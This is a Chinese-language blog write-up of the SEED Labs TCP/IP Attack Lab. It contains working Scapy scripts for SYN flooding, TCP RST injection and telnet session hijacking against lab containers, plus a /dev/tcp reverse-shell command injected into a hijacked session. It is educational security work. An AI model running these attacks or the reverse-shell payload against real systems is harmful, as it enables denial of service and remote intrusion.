<!DOCTYPE html>
<html>
	<head>
		
<title>TCP/IP Attack Lab-无限进步</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link rel="shortcut icon" type="image/x-icon" href="/image/shengdanwu.png">

<link rel="stylesheet" href="/css/index.css">



<meta name="keywords" content="网络安全,">
<meta name="description" content="Seedlabs2.0-TCP/IP Attack Lab实验报告">


<script src="/js/jquery.min.js"></script>


<script src="/js/index.js"></script>


<script src="/js/fancybox.umd.js"></script>


<script src="/js/fancybox-images.js"></script>


<script src="/js/gitalk.min.js"></script>


<script src="/js/hljs.min.js"></script>
 
<script>hljs.highlightAll();</script>

	<meta name="generator" content="Hexo 8.1.1"></head>

	<body>
		
	<div class="header">
		<div class="header-top" id="header-top">
			<div class="h-left">
				<a href="/">
					<img src="/image/shengdanwu.png" alt="Quiet">
				</a>
			</div>
			<div class="h-right">
				<ul>
					
						
								<li>
									<a href="/">
										HOME
									</a>
									<span class="dot"></span>
								</li>
								
									
						
								<li>
									<a href="/archives">
										ARCHIVE
									</a>
									<span class="dot"></span>
								</li>
								
									
						
								<li>
									<a href="/categories">
										CATEGORIES
									</a>
									<span class="dot"></span>
								</li>
								
									
						
								<li>
									<a href="/tags">
										TAGS
									</a>
									<span class="dot"></span>
								</li>
								
									
						
								<li>
									<a href="/links">
										LINKS
									</a>
									<span class="dot"></span>
								</li>
								
									
						
								<li>
									<a href="/about">
										ABOUT
									</a>
									<span class="dot"></span>
								</li>
								
									
				</ul>
			</div>
			<div class="h-right-close">
				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24">
					<path fill="none" d="M0 0h24v24H0z" />
					<path d="M3 4h18v2H3V4zm0 7h18v2H3v-2zm0 7h18v2H3v-2z" fill="rgba(68,68,68,1)" />
				</svg>
			</div>
		</div>
	</div>
	<div class="sidebar">
    <div class="topo">
        <h2>Ram</h2>
    </div>
    <ul>
        
        <li>
            <a href="/">HOME</a>
        </li>
        
        <li>
            <a href="/archives">ARCHIVE</a>
        </li>
        
        <li>
            <a href="/categories">CATEGORIES</a>
        </li>
        
        <li>
            <a href="/tags">TAGS</a>
        </li>
        
        <li>
            <a href="/links">LINKS</a>
        </li>
        
        <li>
            <a href="/about">ABOUT</a>
        </li>
        
    </ul>
    <div class="my_foot">
        
        <a target="_blank" rel="noopener" href="https://github.com/RamBree">
            <img src="https://cdn.jsdelivr.net/gh/duogongneng/MyBlogImg/imggithub.png" alt="Quiet主题">
        </a>
        
    </div>
</div>
<div class='shelter'>
</div>
<style>
    .shelter{
        background-color: #333;
        opacity:0.5;
        cursor: pointer;
        display: none; 
        position: fixed;
        left: 0;
        top: 0; 
        right: 0;
        bottom: 0;
        z-index: 1998;
    }
    .sidebar {
        width: 66%;
        height: 100%;
        position: fixed;
        top: 0;
        right: -100%;
        bottom: 0;
        background: #fff;
        z-index: 1999;
        text-align: center;
        box-shadow: -6px 0 20px rgba(98, 94, 94, .815);
    }

    .topo {
        width: 100%;
        height: 200px;
        background: url(https://api.ixiaowai.cn/gqapi/gqapi.php) no-repeat;
        background-size: 100% 100%;
        position: relative;
        display: flex;
        align-items: flex-end
    }

    .topo h2 {
        color: #fff;
        z-index: 1;
        position: relative;
        margin: 0 0 10px 10px;
        font-size: 1.2em;
        box-sizing: border-box
    }

    .topo:before {
        content: '';
        background-image: url(/image/pattern.png);
        background-repeat: repeat;
        height: 100%;
        left: 0;
        position: absolute;
        top: 0;
        width: 100%;
        z-index: 1
    }

    .sidebar ul {
        width: 100%;
        margin-top: 50px
    }

    .sidebar ul li {
        height: 50px;
        list-style: none;
        font-size: 1.2em;
        text-align: right;
        margin-right: 10px
    }

    .sidebar ul li a {
        display: grid;
        color: #5d606a;
        text-overflow: ellipsis;
        width: 100%;
        text-decoration: none
    }

    .my_foot {
        width: 100%;
        padding: 10px;
        margin-bottom: 10px;
        position: absolute;
        bottom: 0
    }

    .my_foot a {
        text-decoration: none;
        margin-right: 10px;
        display: inline-block
    }

    .my_foot a img {
        width: 30px;
        height: 30px
    }
</style>

<script>
    $( function () {
	$( '.h-right-close>svg' )
		.click( function () {
			$( '.sidebar' )
				.animate( {
					right: "0"
				}, 500 );
			$( '.shelter' )
				.fadeIn( "slow" )
		} );
	$( '.shelter' )
		.click( function ( e ) {
			$( '.sidebar' )
				.animate( {
					right: "-100%"
				}, 500 );
			$( '.shelter' )
				.fadeOut( "slow" )
		} )
} )

</script>

<div class="post">
    <div class="post-header-background post-header-color"
    style="background: url('')" 
>
    <div class="post-header-background-content">
        <ul class="post-header-tag">
            
            
            <li><a href="/tags/网络安全">网络安全</a></li>
            
            
        </ul>
        
        <h1>TCP/IP Attack Lab</h1>
        <div class="post-header-info">
            <div class="post-header-info-author">
                
                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 20">
                        <g>
                            <path fill="#12183A"
                                d="M6.187 15.265A6.47 6.47 0 0 0 10 16.5a6.47 6.47 0 0 0 3.813-1.235A4.99 4.99 0 0 0 10 13.5a4.99 4.99 0 0 0-3.813 1.765zM5.082 14.25A6.485 6.485 0 0 1 10 12c1.965 0 3.726.872 4.918 2.25a6.5 6.5 0 1 0-9.836 0zM10 18a8 8 0 1 1 0-16 8 8 0 0 1 0 16zm0-7a3 3 0 1 1 0-6 3 3 0 0 1 0 6zm0-1.5a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3z">
                            </path>
                        </g>
                    </svg>
                
                <span class="post-header-info-author-text"> <a href="../../about">Ram</a></span>
                <div class="post-header-info-author-categories">
                    
                         <a href="/categories/SeedLabs2.0" target="_blank" >SeedLabs2.0</a>
                    
                </div>
                <p>2025-11-19 14:55:42</p>
            </div>
        </div>
    </div>
</div>
    <div class="post-content" id="content">
  
  <div id="article" class="post-content-info">
    
      <div id="post-toc">
        <span class="post-toc-title">文章目录</span>
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#TCP-IP-Attack-Lab"><span class="toc-text">TCP&#x2F;IP Attack Lab</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-1-SYN-Flooding-Attack"><span class="toc-text">Task 1: SYN Flooding Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Task-1-1-Launching-the-Attack-Using-Python"><span class="toc-text">Task 1.1: Launching the Attack Using Python</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Task-1-2-Launch-the-Attack-Using-C"><span class="toc-text">Task 1.2: Launch the Attack Using C</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Task-1-3-Enable-the-SYN-Cookie-Countermeasure"><span class="toc-text">Task 1.3: Enable the SYN Cookie Countermeasure</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-2-TCP-RST-Attacks-on-telnet-Connections"><span class="toc-text">Task 2: TCP RST Attacks on telnet Connections</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-3-TCP-Session-Hijacking"><span class="toc-text">Task 3: TCP Session Hijacking</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-4-Creating-Reverse-Shell-using-TCP-Session-Hijacking"><span class="toc-text">Task 4: Creating Reverse Shell using TCP Session Hijacking</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li></ol>
      </div>
    

    <h1 id="TCP-IP-Attack-Lab"><a href="#TCP-IP-Attack-Lab" class="headerlink" title="TCP&#x2F;IP Attack Lab"></a>TCP&#x2F;IP Attack Lab</h1><p>本次实验的环境如图所示。</p>
<p><img src="/2025/11/19/seedlab7/image-20251119091706714.png" alt="image-20251119091706714"></p>
<p>记得去删除之前实验创建的container，不然会报错。</p>
<p><img src="/2025/11/19/seedlab7/image-20251119095804869.png" alt="image-20251119095804869"></p>
<p>实验中需要使用telnet来连接，container中已经构建创建好了一个名为<code>seed</code>账户，密码为<code>dees</code>。</p>
<h2 id="Task-1-SYN-Flooding-Attack"><a href="#Task-1-SYN-Flooding-Attack" class="headerlink" title="Task 1: SYN Flooding Attack"></a>Task 1: SYN Flooding Attack</h2><p>这个攻击是通过伪造一些IP地址，来填满受害者主机的队列，使其无法与其他主机建立连接。</p>
<p><img src="/2025/11/19/seedlab7/image-20251119132433602.png" alt="image-20251119132433602"></p>
<p>可以通过<code>sysctl net.ipv4.tcp_max_syn_backlog</code>来查看大小。</p>
<p>也可以通过<code>netstat -nat</code>来查看队列的使用情况。</p>
<p><img src="/2025/11/19/seedlab7/image-20251119101053113.png" alt="image-20251119101053113"></p>
<p><strong>SYN Cookie Countermeasure</strong>:针对这种攻击方式，系统通过<code>SYN cookie</code>来进行防护。在实验中，docker容器的防护都已经被关闭（可以通过docker-compose.yml查看）。同时还要将docker中的privileged设置为true，才能实现该控制，因为这个文件是一个只读文件。</p>
<p><img src="/2025/11/19/seedlab7/image-20251119101346749.png" alt="image-20251119101346749"></p>
<p>相关控制指令</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sysctl</span> <span class="token parameter variable">-a</span> <span class="token operator">|</span> <span class="token function">grep</span> syncookies     <span class="token punctuation">(</span>Display the SYN cookie flag<span class="token punctuation">)</span>
<span class="token function">sysctl</span> <span class="token parameter variable">-w</span> <span class="token assign-left variable">net.ipv4.tcp_syncookies</span><span class="token operator">=</span><span class="token number">0</span> <span class="token punctuation">(</span>turn off SYN cookie<span class="token punctuation">)</span>
<span class="token function">sysctl</span> <span class="token parameter variable">-w</span> <span class="token assign-left variable">net.ipv4.tcp_syncookies</span><span class="token operator">=</span><span class="token number">1</span> <span class="token punctuation">(</span>turn on  SYN cookie<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>可以通过下面的命令来查看受害者主机的队列情况</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">netstat</span> <span class="token parameter variable">-tna</span> <span class="token operator">|</span> <span class="token function">grep</span> SYN_RECV <span class="token operator">|</span> <span class="token function">wc</span> <span class="token parameter variable">-l</span>
ss <span class="token parameter variable">-n</span> state syn-recv sport <span class="token operator">=</span> :23 <span class="token operator">|</span> <span class="token function">wc</span> <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="Task-1-1-Launching-the-Attack-Using-Python"><a href="#Task-1-1-Launching-the-Attack-Using-Python" class="headerlink" title="Task 1.1: Launching the Attack Using Python"></a>Task 1.1: Launching the Attack Using Python</h3><p>python攻击代码</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/env python3</span>
<span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> IP<span class="token punctuation">,</span> TCP<span class="token punctuation">,</span> send
<span class="token keyword">from</span> ipaddress <span class="token keyword">import</span> IPv4Address
<span class="token keyword">from</span> random <span class="token keyword">import</span> getrandbits

ip <span class="token operator">=</span> IP<span class="token punctuation">(</span>dst<span class="token operator">=</span><span class="token string">"10.9.0.5"</span><span class="token punctuation">)</span>
tcp <span class="token operator">=</span> TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span><span class="token number">23</span><span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token string">'S'</span><span class="token punctuation">)</span>
pkt <span class="token operator">=</span> ip<span class="token operator">/</span>tcp

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    pkt<span class="token punctuation">[</span>IP<span class="token punctuation">]</span><span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>IPv4Address<span class="token punctuation">(</span>getrandbits<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># source iP</span>
    pkt<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>sport <span class="token operator">=</span> getrandbits<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token comment"># source port</span>
    pkt<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>seq <span class="token operator">=</span> getrandbits<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span> <span class="token comment"># sequence number</span>
    send<span class="token punctuation">(</span>pkt<span class="token punctuation">,</span> verbose <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以看见受害者主机多了很多连接状态。</p>
<p><img src="/2025/11/19/seedlab7/image-20251119103329729.png" alt="image-20251119103329729"></p>
<p>此时我试图通过telnet连接的时候，会卡住无法连接，最后导致失败。</p>
<p><img src="/2025/11/19/seedlab7/image-20251119102802958.png" alt="image-20251119102802958"></p>
<p><img src="/2025/11/19/seedlab7/image-20251119103038350.png" alt="image-20251119103038350"></p>
<p><strong>一些问题</strong></p>
<ol>
<li>如果主机已经跟受害主机建立过TCP连接，那么就算在被遭受攻击，也能够成功连接。这是由于内核的缓解机制：当SYN Cookies功能被禁用时，TCP会为“已验证的目的地”预留四分之一的后备队列空间。因此后续来自该地址的连接将使用预留槽位，从而不受SYN洪水攻击影响。若需消除此缓解措施的效果，可在服务器端执行“ip tcp metrics flush”命令。</li>
<li>TCP重传机制：发送SYN+ACK数据包后，受害主机将等待ACK数据包。若ACK未能及时到达，TCP将重传SYN+ACK数据包。重传次数取决于以下内核参数（默认值为5）。<br>经过5次重传后，TCP将从半开连接队列中移除对应项。每次移除项都会释放一个槽位。攻击数据包与合法telnet连接请求将争夺此空位。由于Python程序运行速度可能不足，可能输给合法telnet数据包。为赢得竞争，可并行运行多个攻击程序实例。请尝试此方法并观察成功率是否提升。</li>
</ol>
<h3 id="Task-1-2-Launch-the-Attack-Using-C"><a href="#Task-1-2-Launch-the-Attack-Using-C" class="headerlink" title="Task 1.2: Launch the Attack Using C"></a>Task 1.2: Launch the Attack Using C</h3><p>效果跟task1.1类似。但是c语言更快，成功的概率更高。（代码由实验手册提供）</p>
<p><img src="/2025/11/19/seedlab7/image-20251119105848660.png" alt="image-20251119105848660"></p>
<h3 id="Task-1-3-Enable-the-SYN-Cookie-Countermeasure"><a href="#Task-1-3-Enable-the-SYN-Cookie-Countermeasure" class="headerlink" title="Task 1.3: Enable the SYN Cookie Countermeasure"></a>Task 1.3: Enable the SYN Cookie Countermeasure</h3><p>我可以打开syncookies防护，然后打开攻击，发现telnet能够连接上</p>
<p><img src="/2025/11/19/seedlab7/image-20251119110830649.png" alt="image-20251119110830649"></p>
<h2 id="Task-2-TCP-RST-Attacks-on-telnet-Connections"><a href="#Task-2-TCP-RST-Attacks-on-telnet-Connections" class="headerlink" title="Task 2: TCP RST Attacks on telnet Connections"></a>Task 2: TCP RST Attacks on <strong>telnet</strong> Connections</h2><p>TCP RST攻击可终止两个受害者之间已建立的TCP连接。例如，当用户A与B之间存在已建立的telnet连接（TCP）时，攻击者可伪造从A发往B的RST数据包，从而破坏该现有连接。要使此攻击成功，攻击者需正确构造TCP RST数据包。</p>
<p>也可以实现自动化，首先监听报文，然后篡改。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token keyword">def</span> <span class="token function">spoof_pkt</span><span class="token punctuation">(</span>pkt<span class="token punctuation">)</span><span class="token punctuation">:</span>
	ip <span class="token operator">=</span> IP<span class="token punctuation">(</span>src<span class="token operator">=</span>pkt<span class="token punctuation">[</span>IP<span class="token punctuation">]</span><span class="token punctuation">.</span>src<span class="token punctuation">,</span> dst<span class="token operator">=</span>pkt<span class="token punctuation">[</span>IP<span class="token punctuation">]</span><span class="token punctuation">.</span>dst<span class="token punctuation">)</span>
	tcp <span class="token operator">=</span> TCP<span class="token punctuation">(</span>sport<span class="token operator">=</span><span class="token number">23</span><span class="token punctuation">,</span> dport<span class="token operator">=</span>pkt<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>dport<span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token string">"R"</span><span class="token punctuation">,</span> seq<span class="token operator">=</span>pkt<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>seq<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>
	pkt <span class="token operator">=</span> ip<span class="token operator">/</span>tcp
	ls<span class="token punctuation">(</span>pkt<span class="token punctuation">)</span>
	send<span class="token punctuation">(</span>pkt<span class="token punctuation">,</span> verbose<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
	
f <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'tcp and src host 10.9.0.5'</span></span>
pkt <span class="token operator">=</span> sniff<span class="token punctuation">(</span>iface<span class="token operator">=</span><span class="token string">'br-6a333ca53e4c'</span><span class="token punctuation">,</span> <span class="token builtin">filter</span><span class="token operator">=</span>f<span class="token punctuation">,</span> prn<span class="token operator">=</span>spoof_pkt<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我用一个用户主机尝试连接<code>10.9.0.5</code>时，会被中断。</p>
<p><img src="/2025/11/19/seedlab7/image-20251119115549744.png" alt="image-20251119115549744"></p>
<h2 id="Task-3-TCP-Session-Hijacking"><a href="#Task-3-TCP-Session-Hijacking" class="headerlink" title="Task 3: TCP Session Hijacking"></a>Task 3: TCP Session Hijacking</h2><p>TCP会话劫持攻击的目标是通过向现有TCP连接（会话）注入恶意内容，劫持两个受害者之间的通信通道。若该连接为Telnet会话，攻击者可向其中注入恶意指令（例如删除重要文件），迫使受害者执行这些指令。下图展示了攻击的运作机制。在本任务中，你需要演示如何劫持两台计算机间的telnet会话。你的目标是使telnet服务器执行你发送的恶意命令。</p>
<p><img src="/2025/11/19/seedlab7/image-20251119120127610.png" alt="image-20251119120127610"></p>
<p>构建了代码，如果监听到<code>10.9.0.5</code>发送的报文则，返回一个伪造的报文。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token keyword">def</span> <span class="token function">spoof_pkt</span><span class="token punctuation">(</span>pkt<span class="token punctuation">)</span><span class="token punctuation">:</span>
	ip <span class="token operator">=</span> IP<span class="token punctuation">(</span>src<span class="token operator">=</span>pkt<span class="token punctuation">[</span>IP<span class="token punctuation">]</span><span class="token punctuation">.</span>dst<span class="token punctuation">,</span> dst<span class="token operator">=</span>pkt<span class="token punctuation">[</span>IP<span class="token punctuation">]</span><span class="token punctuation">.</span>src<span class="token punctuation">)</span>
	tcp <span class="token operator">=</span> TCP<span class="token punctuation">(</span>sport<span class="token operator">=</span>pkt<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>dport<span class="token punctuation">,</span> dport<span class="token operator">=</span><span class="token number">23</span><span class="token punctuation">,</span>
              flags<span class="token operator">=</span><span class="token string">"A"</span><span class="token punctuation">,</span>
              seq<span class="token operator">=</span>pkt<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>ack<span class="token punctuation">,</span> ack<span class="token operator">=</span>pkt<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>seq<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>
	data <span class="token operator">=</span> <span class="token string">"echo \"ლ(́◕◞౪◟◕‵ლ)\" >> ~/hijacking.out\n\0"</span>
	pkt <span class="token operator">=</span> ip<span class="token operator">/</span>tcp<span class="token operator">/</span>data
	ls<span class="token punctuation">(</span>pkt<span class="token punctuation">)</span>
	send<span class="token punctuation">(</span>pkt<span class="token punctuation">,</span> verbose<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
	
f <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'tcp and src host 10.9.0.5'</span></span>
pkt <span class="token operator">=</span> sniff<span class="token punctuation">(</span>iface<span class="token operator">=</span><span class="token string">'br-b10103161082'</span><span class="token punctuation">,</span> <span class="token builtin">filter</span><span class="token operator">=</span>f<span class="token punctuation">,</span> prn<span class="token operator">=</span>spoof_pkt<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>首先<code>10.9.0.6</code>连接到<code>10.9.0.5</code>，然后运行该程序</p>
<p><img src="/2025/11/19/seedlab7/image-20251119171005354.png" alt="image-20251119171005354"></p>
<p>telnet连接卡死，同时发现多了一个hijacking文件</p>
<p><img src="/2025/11/19/seedlab7/image-20251119171139802.png" alt="image-20251119171139802"></p>
<h2 id="Task-4-Creating-Reverse-Shell-using-TCP-Session-Hijacking"><a href="#Task-4-Creating-Reverse-Shell-using-TCP-Session-Hijacking" class="headerlink" title="Task 4: Creating Reverse Shell using TCP Session Hijacking"></a>Task 4: Creating Reverse Shell using TCP Session Hijacking</h2><p>在task3的基础上，只需要修改data段即可。获取反向shell的命令如下。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">data <span class="token operator">=</span> <span class="token string">"/bin/bash -i > /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2>&amp;1\n\0"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2025/11/19/seedlab7/image-20251119173034349.png" alt="image-20251119173034349"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过这个实验学习到了TCP SYN Flooding攻击、TCP RST攻击和TCP Session Hijacking。三种攻击方式的原理都比较简单，通过scapy构建报文也不算难。</p>

  </div>
  <div id=""></div>
</div>

<script>
  
Fancybox.bind('[data-fancybox="fancybox-gallery-img"]', {
  dragToClose: true,
  Toolbar: true,
  closeButton: "top",
  Image: {
    zoom: true,
  },
  on: {
    initCarousel: (fancybox) => {
      const slide = fancybox.Carousel.slides[fancybox.Carousel.page];
      fancybox.$container.style.setProperty(
        "--bg-image",
        `url("${slide.$thumb.src}")`
      );
    },
    "Carousel.change": (fancybox, carousel, to, from) => {
      const slide = carousel.slides[to];
      fancybox.$container.style.setProperty(
        "--bg-image",
        `url("${slide.$thumb.src}")`
      );
    },
  },
});
</script>

<style>
    #noneimg img {
        display: none;
        z-index: 9999;
        /* width: 600px !important; */
        min-width: 0%;
        max-width: 90%;
        max-height: 80%;
        border-radius: 0px;
        position: fixed;
        box-shadow: 0 0 0px #c3c3c300 !important;
        left: 0;
        top: 0;
        right: 0;
        bottom: 0;
        margin: auto !important;
    }

    @media screen and (max-width:600px) {
        #noneimg img {
            max-width: 88%
        }
    }
</style>

    <div class="post-paging">
    
    <a href="/2025/11/24/seedlab8/">
        <div class="post-paging-last">
            <span>上一篇</span>
            <p>The Kaminsky Attack Lab</p>
        </div>
    </a>
    

    
    <a href="/2025/11/12/seedlab6/">
        <div class="post-paging-next">
            <span>下一篇</span>
            <p>Packet Sniffing and Spoofing Lab</p>
        </div>
    </a>
    
</div>
</div>
		
<div class="footer">
	<div class="Copyright">
		©2025 By Ram. 主题：<a
			style="text-decoration: none;display: contents; color: #898F9F;"
			target="_blank" rel="noopener" href="https://github.com/79e/hexo-theme-quiet">Quiet</a>
	</div>
	<div class="contact">
		
		<a target="_blank" rel="noopener" href="https://github.com/RamBree">
			<img src="https://cdn.jsdelivr.net/gh/duogongneng/MyBlogImg/imggithub.png" alt="Quiet主题">
		</a>
		
	</div>
</div>

<script src="/js/gotop.js"></script>


<style type="text/css">
    @media screen and (min-width: 600px) {
        .goTop>span {
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 10px;
            width: 40px;
            height: 40px;
            cursor: pointer;
            opacity: 0.8;
            background: rgba(18, 24, 58, 0.06);
            text-align: center;
            transition: border .5s;
            border: 1px solid rgba(18, 24, 58, 0.06);

            -moz-transition: border .5s;
            /* Firefox 4 */
            -webkit-transition: border .5s;
            /* Safari 和 Chrome */
            -o-transition: border .5s;
            /* Opera */
        }

        .goTop>span:hover {
            border: 1px solid #6680B3;
        }


        .goTop {
            position: fixed;
            right: 30px;
            bottom: 80px;
        }

        .goTop>span>svg {
            width: 20px;
            height: 20px;
            opacity: 0.7;
        }

    }

    @media screen and (max-width: 600px) {
        .goTop {
            display: none;
        }
    }
</style>
<div class="goTop" id="js-go_top">
    <span>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
            <g>
                <path d="M13 12v8h-2v-8H4l8-8 8 8z"></path>
            </g>
        </svg>
    </span>
</div>
<script>
    $( '#js-go_top' )
	.gotoTop( {
		offset: 500,
		speed: 300,
		animationShow: {
			'transform': 'translate(0,0)',
			'transition': 'transform .5s ease-in-out'
		},
		animationHide: {
			'transform': 'translate(100px,0)',
			'transition': 'transform .5s ease-in-out'
		}
	} );
</script>


<!-- Baidu Analytics -->
<script defer>
    var _hmt = _hmt || [];
    (function () {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?f87362af66251bc3b7603e9ecfa19123";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
    })();
</script>



    <!-- Gitalk -->
    <script>
        const data = '{"clientID":"02b3c","clientSecret":"adfc7b4","repo":"gimment","owner":"duneng","admin":"duneng"}'
        const gitalk = new Gitalk({
            ...JSON.parse( data),
            id:location.pathname,
            distractionFreeMode:false
        })
        
        if(Boolean('false')){
            gitalk.render('gitalk-container')
        }
    </script>

<script>
	console.log('\n %c Hexo-Quiet 主题 %c https://github.com/79e/hexo-theme-quiet \n', 'color: #fadfa3; background: #030307; padding:5px 0;', 'background: #fadfa3; padding:5px 0;')
</script>
	</body>
</html>

